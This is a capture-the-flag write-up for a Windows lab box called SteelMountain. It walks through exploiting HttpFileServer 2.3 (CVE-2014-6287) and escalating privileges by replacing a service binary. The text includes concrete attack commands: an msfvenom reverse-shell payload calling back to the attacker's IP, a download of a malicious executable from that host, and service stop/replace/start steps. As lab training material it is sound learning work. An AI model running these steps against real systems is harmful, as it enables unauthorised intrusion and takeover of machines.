SteelMountain

Target IP: 10.10.37.107
Challenge Description:

Reconnaissance


I want to complete this CTF without the use of Metasploit. The tool Metasploit makes it too easy. Performing a port scan against the target machine shows there are multiple TCP ports open on the target machine, as shown above.

Performing an aggressive port scan against the open TCP ports returns the result above. By the looks of it, the target machine is running Windows. There are interesting applications running on the target machine, such as port 80 and 8080. I will start enumeration there.

Enumeration

Port 80: HTTP

The webpage above is returned for this port. It contains an image of Bill Harper. However, the source-code of this webpage is not helpful. Performing a directory search lead to nothing.

Port 8080: HTTP

The webpage above is returned for this port. The target machine seems to be running some kind of HTTP server. The name & version of this web application HttpFileServer 2.3 is also provided.


Doing a Google search for HttpFileServer 2.3 exploits lead me to the exploit shown above. This vulnerability has the CVE of CVE-2014-6287. Is this web application vulnerable to RCE? Is the target machine running a vulnerable software at this port? Time to test it.

Exploitation


I made a copy of the Python exploit on my machine. Then I changed the four variables: lport, lhost, rport, and rhost as shown above. I changed the lport to catch the reverse shell on my machine at port 8443. And the rhost and rport is set to the target machine and its web application on port 80.


Then I executed the Python exploit using the command python3 exploit.py and immediately obtained a reverse shell connection from the target machine on the same exploit session, as shown above. Now I have a foothold on the target machine with the session as the user Bill, aka the Employee of the month. The exploit landed me a Powershell session, instead of of cmd, which makes it even better!

Privilege Escalation


By the looks of it, the target machine is running Windows Server 2012, as shown above. Before serching for kernel exploits, I wish to enumerate the machine further.


Checking the account information using net user bill shows the important information above. It looks like this user has low privileges on the machine. And this user only belongs to the group Users.


Using the command Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}, I checked for any unquoted service paths and obtained the interesting result above. The service name AdvancedSystemCareService9 sounds interesting to me. The path of this service file has spaces and it is not quoted; meaning, it can be exploited. Maybe I can replace the binary with a malicious binary, if I have write permission over it.


After browsing to C:\Program Files (x86)\IObit\Advanced SystemCare, I notice there are plenty of applications. The current user, bill, has write permissions over the binary ASCService.exe. Time to replace this binary with a malicious binary.


On my machine, I created the code above. This C code is responsible for creating a new user called billadmin with the password password123!. Then this user is added into the Administrator group; therefore, this user should give me administrator privileges. But this method will only work if the RDP is turned on for the target machine.


And then I compiled the code and created an executable with the name ASCService.exe. The target machine is running x64 architecture, so I used x86_64-w64-mingw32-gcc to cross-compile. Then I fired up a Python HTTP server on my machine at port 80 to serve this malicious file to the target machine.


I used the command sc stop AdvancedSystemCareService9 to stop the service AdvancedSystemCareService9. Using the command iwr -uri http://10.14.55.153/ASCService.exe -Outfile ASCService.exe, I downloaded the malicious executable file on the Desktop of user Bill. Then I used the command copy c:\users\bill\desktop\ASCService.exe "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe" to copy the malicious binary application to replace the original ASCService.exe binary file.


Running net user shows there are only three main users at the moment. If the target machine executes the malicious service file, the new user with Administrator privileges will be added!


After starting the service using the command sc start AdvancedSystemCareService9, and waiting for some time. I also had to use the command net stop AdvancedSystemCareService9 and then net start AdvancedSystemCareService9. Then it worked! Running net user now shows there are four users, one of them being billadmin as shown above. And this new user belongs to the Administrators group when checking it with net user billadmin. Although this method worked, I am unable to RDP into the target machine. This was a good practice. Maybe we can add the user to the Remote Desktop Users group? I will leave that to you to experiment with. But for now, it is time to upload a malicious reverse shell by replacing the binary file instead.


Using the command msfvenom -p windows/shell_reverse_tcp LHOST=10.14.55.153 LPORT=8443 -e x86/shikata_ga_nai -f exe-service -o ASCService.exe, I created an encoded Windows reverse shell that will replace the ASCService.exe file. The payload has been encoded further using the module shikata_ga_nai. And the exe-service file type has been chosen, as I will be replacing the original file.


Then I transferred this to the target machine via Python HTTP server. And I stopped the service, replaced the ASCService.exe with the new reverse shell ASCService.exe, and restarted the service. And bingo! Now I have a system access shell on the target machine from my machine at port 8443! GG :)
